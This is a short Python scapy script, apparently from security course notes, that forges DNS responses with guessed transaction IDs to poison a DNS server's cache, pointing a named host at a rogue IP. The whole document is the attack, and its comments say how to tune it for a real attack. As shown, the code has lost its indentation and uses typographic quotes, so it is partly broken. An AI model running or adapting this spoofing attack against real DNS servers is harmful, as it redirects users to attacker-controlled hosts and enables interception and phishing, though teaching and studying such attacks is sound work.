from scapy.all import *
import time

sourceIP = '10.0.0.3' # IP address of the attacking host #(A)
destIP = '10.0.0.8' # IP address of the victim dns server #(B)
# (If victim dns server is in your LAN, this
# must be a valid IP in your LAN since otherwise
# ARP would not be able to get a valid MAC
# address and the UDP datagram would have
# nowhere to go)

destPort = 53 # commonly used port by DNS servers #(C)
sourcePort = 10323 #(D)
# Transaction IDs to use:
spoofing_set = [34000,34001] # Make it to be a large and apporpriate #(E)
# range for a real attack
victim_host_name = "moonshine.ecn.purdue.edu" #(F)
# The name of the host whose IP
# address you want to corrupt with a
# rogue IP address in the cache of
# the targetd DNS server (in line (B))
rogueIP= ’10.0.0.26’ # See the comment above #(G)
udp_packets = [] # This will be the collection of DNS response packets #(H)
# with each packet using a different transaction ID
for dns_trans_id in spoofing_set: #(I)
udp_packet = ( IP(src=sourceIP, dst=destIP )
/UDP(sport=sourcePort, dport=destPort)
/DNS( id=dns_trans_id, rd=0, qr=1, ra=0, z=0, rcode=0,
qdcount=0, ancount=0, nscount=0, arcount=0,
qd=DNSRR(rrname=victim_host_name, rdata=rogueIP,
type="A",rclass="IN") ) ) #(J)
udp_packets.append(udp_packet) #(K)
interval = 1 # for the number of seconds between successive #(L)
# transmissions of the UDP reponse packets.
# Make it 0.001 for a real attack. The value of 1
# is good for dubugging.
repeats = 2 # Give it a large value for a real attack #(M)
attempt = 0 #(N)
while attempt < repeats:
for udp_packet in udp_packets: #(O)
sr(udp_packet) #(P)
time.sleep(interval) #(Q)
attempt += 1
